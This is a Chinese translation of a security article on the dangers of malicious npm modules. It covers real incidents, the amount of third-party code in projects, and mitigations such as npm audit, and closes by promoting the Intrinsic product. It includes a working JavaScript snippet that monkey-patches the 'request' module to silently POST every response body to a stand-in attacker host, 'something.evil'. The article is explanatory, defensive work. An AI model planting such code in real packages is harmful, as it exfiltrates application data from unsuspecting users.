# 常见的Node.js攻击-恶意模块的危害 #

![](https://user-gold-cdn.xitu.io/2019/6/5/16b2563a4a730550?imageView2/0/w/1280/h/960/ignore-error/1)

根据最近 [npm的一项安全性调查]( https://link.juejin.im?target=https%3A%2F%2Fmedium.com%2Fnpm-inc%2Fsecurity-in-the-js-community-4bac032e553b ) 显示，77%的受访者对OSS/第三方代码的安全性表示担忧。本文将介绍关于这方面的内容，通过第三方代码引入应用程序的安全漏洞。具体来说，我们考虑被恶意引入的漏洞的场景。

## 我应该担心第三方模块吗? ##

你可能疑惑的第一件事是，是否需要担心恶意模块？程序员是一群非常友好的人，我们为什么要怀疑他们发布的模块呢?而且，如果npm上的每个包都是开源的，那么肯定有大量的眼睛来跟踪每一行代码，不是吗?此外，我只有几个模块，能有多少第三方代码呢?

在探究这些答案之前，让我们先看看这篇文章:“ [我正在从你的站点获取信用卡号码和密码，方法在这]( https://link.juejin.im?target=https%3A%2F%2Fhackernoon.com%2Fim-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5 ) "。这是一个虚构的故事，讲的是npm上的Node.js模块的作者，该模块能够偷偷地从网站上盗取信用卡。故事详细介绍了隐藏这些活动的各种方法。例如，代码从来不会在localhost环境上运行，它从来不会在开发控制台打开时运行，它只在很短一段时间内运行，并且发布到npm的代码被混淆了，并且与在GitHub上公开托管的代码不同。虽然这个故事是虚构的，但它所描述的技术方法是完全可行的。

当然，那只是一个虚构的故事。现实真的有这样的例子吗?npm最近发布了这篇文章:“ [恶意模块报告:getcookies]( https://link.juejin.im?target=https%3A%2F%2Fblog.npmjs.org%2Fpost%2F173526807575%2Freported-malicious-module-getcookies ) ”。本文介绍了一个实际情况，文中描述的模块被发布并成为其他模块的依赖项。当接收到精心设计的头信息时，将触发此恶意模块，然后执行请求中提供的任意JavaScript代码。

` getcookies` 模块确实也成为了几个模块的依赖项，但理论上这种损害并没有被广泛传播。您现在可能想知道会造成多大的破坏，或者攻击者会对npm生态系统产生多大的影响。在“ [收集弱npm凭证]( https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FChALkeR%2Fnotes%2Fblob%2Fmaster%2FGathering-weak-npm-credentials.md ) ”这篇文章中，一位安全研究人员描述了他如何获取npm用户帐户凭证(从而获得发布权)，这些帐户占整个npm包生态系统的14%。这是通过从许多可用的凭据泄漏和强制使用弱密码收集凭据来实现的。由于这些包是其他包的依赖项，研究人员能够瞬时影响54%的整个npm生态系统!如果研究人员发布了他所控制的每个包的补丁版本，然后运行一个 ` npm install` ，其中包含54%包中的任意一个包的依赖树，就会执行研究人员的代码。

更为严重的是，即使是善意的包作者也可能成为网络钓鱼和密码泄漏的受害者。为了防止以上问题的出现，npm确实为其服务增加了双因子认证 (2FA)。然而，即使添加了2FA，托管在npm上的包也不一定是全部启用的。2FA是可选的，不太可能所有的npm包作者都启用它。虽然2FA更安全，但许多2FA方法也容易受到钓鱼攻击。

当然，模块作者更有可能意外地向模块添加漏洞，而不是故意这样做。 [学者们发现Node.js模块中存在大量注入漏洞]( https://link.juejin.im?target=https%3A%2F%2Fblog.acolyer.org%2F2018%2F03%2F12%2Fsynode-understanding-and-automatically-preventing-injection-attacks-on-node-js%2F ) ，这可能会使您的应用程序变得脆弱。我们才真正开始关注这方面的研究，随着生态系统和Node.js开发人员数量的增加，针对npm模块的攻击只会变得越来越有利可图。

## 我使用了多少第三方代码? ##

如果让你预估你的代码库中有多少是应用程序代码，有多少是第三方代码？现在你应该得到一个数字，接下来在应用程序中运行以下命令。该命令计算应用程序中的代码行数，并将其与node_modules目录中的代码行数进行比较。

` npx @intrinsic/loc 复制代码`

这个命令的输出可能有点令人惊讶。对于一个拥有数千行应用程序代码的项目来说，拥有超过100万行的第三方代码是很常见的。

## 到底能造成多大的伤害? ##

现在你可能想知道到底会造成什么样的伤害。例如，如果您的应用程序依赖于模块A，而模块A又依赖于模块B，最后依赖于模块C，那么我们将一些重要数据传递给模块C的几率有多大呢?

为了让恶意包造成破坏，不管它在require层次结构中有多深，甚至不管它是否直接传递敏感数据。重要的是代码被 ` require` 了。下面是一个恶意模块如何修改全局 ` request` 的例子，它很难被检测到，并且会影响整个应用程序:

` { // Require the popular `request` module const request = require ( 'request' ) // Monkey-patch so every request now runs our function const RequestOrig = request.Request request.Request = ( options ) => { const origCallback = options.callback // Any outbound request will be mirrored to something.evil options.callback = ( err, httpResponse, body ) => { const rawReq = require ( 'http' ).request({ hostname : 'something.evil' , port : 8000 , method : 'POST' }) // Failed requests are silent rawReq.on( 'error' , () => {}) rawReq.write( JSON.stringify(body, null , 2 )) rawReq.end() // The original request is still made and handled origCallback.apply( this , arguments ) } if ( new.target) { return Reflect.construct(RequestOrig, [options]) } else { return RequestOrig(options) } }; } 复制代码`

这个代码示例(如果包含在Node.js进程所需的任何模块中)将拦截通过请求库发出的所有请求，并将响应发送到攻击者的服务器。

现在想象一下，如果我们把这个模块修改得更邪恶。例如，它甚至可以修补内部加密模块提供的方法。这可以用来将进程加密的任何字符串发送给第三方。这将影响将密码作为依赖项的其他模块，例如数据库模块在散列密码时执行auth或bcrypt模块。

模块还可以对express模块进行补丁，并创建一个中间件，该中间件在每个传入请求上运行。然后，这些数据可以很容易地广播给攻击者。

## 缓解 ##

我们可以做几件事来保护自己免受恶意模块的攻击。首先要做的是了解应用程序中安装的模块数量。您应该始终知道应用程序依赖于多少模块。如果您曾经找到两个提供相同功能的模块，请选择依赖关系较少的模块。拥有较少的依赖意味着拥有较小的攻击面。

一些较大的公司实际上会有一个团队手工审核每个软件包和软件包的白名单版本，然后允许公司的其他人员使用!考虑到npm上可用的包和发行版本的数量，这种方法并不实际。此外，许多包维护人员将安全更新作为补丁发布，这样用户就可以获得自动更新，但是如果审查过程很慢，那么应用程序的安全性就会降低!

npm最近收购了NSP并发布了 ` npm audit` ( https://link.juejin.im?target=https%3A%2F%2Fblog.npmjs.org%2Fpost%2F173719309445%2Fnpm-audit-identify-and-fix-insecure ) 。此工具将扫描已安装的依赖项，并将其与包含已知漏洞的模块/版本的黑名单进行比较。运行 ` npm install` 甚至会告诉您是否存在已知的漏洞。运行 ` npm audit fix` 程序将尝试用永久兼容的版本替换易受攻击的包(如果存在的话)。

这个工具虽然功能强大，但仅仅是抵御恶意模块的开始。这是一种保守的方法:它取决于已知和报告的漏洞。它依赖于在开发机器上运行命令的开发人员，查看输出，将依赖关系更改为不再需要脆弱模块，然后再次部署。如果已知某个漏洞，它将不会主动保护当前部署的服务。

![](https://user-gold-cdn.xitu.io/2019/6/5/16b2563f4074725f?imageView2/0/w/1280/h/960/ignore-error/1) 通常情况下，对于还没有补丁版本的包， ` npm audit` 会发现问题(如截图中显示的stringstream包)。例如,模块A不是经常更新,并且它依赖了一个有漏洞版本的模块B,然后模块B的版本被维护者修复了,应用程序所有者不能简单地更新模块B的版本。另一个缺点是，有时审计的结果是无法利用的问题，例如模块中的ReDoS漏洞，该漏洞从不接收来自最终用户的字符串。

读完这篇文章后，您甚至可能想完全避免使用所有第三方模块。当然，这是完全不切实际的，因为在npm上有大量可用的模块，重新创建它们将是一项昂贵的工作。构建Node.js应用程序的吸引力来自于npm上庞大的模块生态系统，以及我们构建可生产应用程序的速度。避免第三方模块违背了这一目的。

记住，一定要注意您已经安装的模块，注意您的依赖关系树，注意具有大量依赖关系的模块，并仔细检查您正在考虑添加的模块。这些是防止恶意模块进入依赖关系树的最佳方法。一旦模块成为依赖项，及时更新它们，因为这是获得安全补丁的好方法。不幸的是，如果您的应用程序的依赖关系树中最终出现了一个恶意模块，或者发现了一个零日漏洞，那么你也无能为力。您可以继续运行 ` npm audit` ，希望有人报告易受攻击的代码，但即使这样也意味着您应用对外使用期间易受攻击。如果您真的希望主动地保护Node.js应用程序免受恶意模块的攻击，防止恶意的网络请求、危险的文件系统访问和限制子进程执行，或者您需要使用 ` Intrinsic` ( https://link.juejin.im?target=https%3A%2F%2Fintrinsic.com%2F ) 。

> 
> 
> 
> 译者注：前面介绍了那么多，后面的文章话锋一转介绍了Intrinsic这个产品，感兴趣的朋友异步到他们的官网查看，不再继续翻译。
> 
> 

原文： [common node.js attack vectors:the dangers of malicious modules]( https://link.juejin.im?target=https%3A%2F%2Fmedium.com%2Fintrinsic%2Fcommon-node-js-attack-vectors-the-dangers-of-malicious-modules-863ae949e7e8 )